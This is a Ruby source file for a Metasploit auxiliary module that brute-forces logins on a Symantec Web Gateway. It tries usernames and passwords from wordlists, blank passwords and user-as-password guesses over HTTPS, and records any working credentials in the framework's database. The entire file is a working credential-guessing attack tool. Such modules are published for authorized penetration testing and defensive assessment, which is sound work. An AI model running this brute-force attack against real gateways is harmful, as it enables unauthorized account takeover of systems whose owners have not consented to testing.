##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/login_scanner/symantec_web_gateway'
require 'metasploit/framework/credential_collection'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Symantec Web Gateway Login Utility',
      'Description' => %q{
        This module will attempt to authenticate to a Symantec Web Gateway.
      },
      'Author'      => [ 'sinn3r' ],
      'License'     => MSF_LICENSE,
      'DefaultOptions' =>
        {
          'RPORT'      => 443,
          'SSL'        => true,
        }
    ))

    register_options(
      [
        OptString.new('USERNAME', [false, 'The username to specify for authentication', '']),
        OptString.new('PASSWORD', [false, 'The password to specify for authentication', ''])
      ])
  end


  def scanner(ip)
    @scanner ||= lambda {
      cred_collection = Metasploit::Framework::CredentialCollection.new(
        blank_passwords: datastore['BLANK_PASSWORDS'],
        pass_file:       datastore['PASS_FILE'],
        password:        datastore['PASSWORD'],
        user_file:       datastore['USER_FILE'],
        userpass_file:   datastore['USERPASS_FILE'],
        username:        datastore['USERNAME'],
        user_as_pass:    datastore['USER_AS_PASS']
      )

      return Metasploit::Framework::LoginScanner::SymantecWebGateway.new(
        configure_http_login_scanner(
          host: ip,
          port: datastore['RPORT'],
          cred_details:       cred_collection,
          stop_on_success:    datastore['STOP_ON_SUCCESS'],
          bruteforce_speed:   datastore['BRUTEFORCE_SPEED'],
          connection_timeout: 5,
          http_username:      datastore['HttpUsername'],
          http_password:      datastore['HttpPassword']
        ))
    }.call
  end


  def report_good_cred(ip, port, result)
    service_data = {
      address: ip,
      port: port,
      service_name: 'http',
      protocol: 'tcp',
      workspace_id: myworkspace_id
    }

    credential_data = {
      module_fullname: self.fullname,
      origin_type: :service,
      private_data: result.credential.private,
      private_type: :password,
      username: result.credential.public,
    }.merge(service_data)

    login_data = {
      core: create_credential(credential_data),
      last_attempted_at: DateTime.now,
      status: result.status,
      proof: result.proof
    }.merge(service_data)

    create_credential_login(login_data)
  end


  def report_bad_cred(ip, rport, result)
    invalidate_login(
      address: ip,
      port: rport,
      protocol: 'tcp',
      public: result.credential.public,
      private: result.credential.private,
      realm_key: result.credential.realm_key,
      realm_value: result.credential.realm,
      status: result.status,
      proof: result.proof
    )
  end


  # Attempts to login
  def bruteforce(ip)
    scanner(ip).scan! do |result|
      case result.status
      when Metasploit::Model::Login::Status::SUCCESSFUL
        print_brute(:level => :good, :ip => ip, :msg => "Success: '#{result.credential}'")
        report_good_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::UNABLE_TO_CONNECT
        vprint_brute(:level => :verror, :ip => ip, :msg => result.proof)
        report_bad_cred(ip, rport, result)
      when Metasploit::Model::Login::Status::INCORRECT
        vprint_brute(:level => :verror, :ip => ip, :msg => "Failed: '#{result.credential}'")
        report_bad_cred(ip, rport, result)
      end
    end
  end


  # Start here
  def run_host(ip)
    unless scanner(ip).check_setup
      print_brute(:level => :error, :ip => ip, :msg => 'Target is not Symantec Web Gateway')
      return
    end

    bruteforce(ip)
  end
end
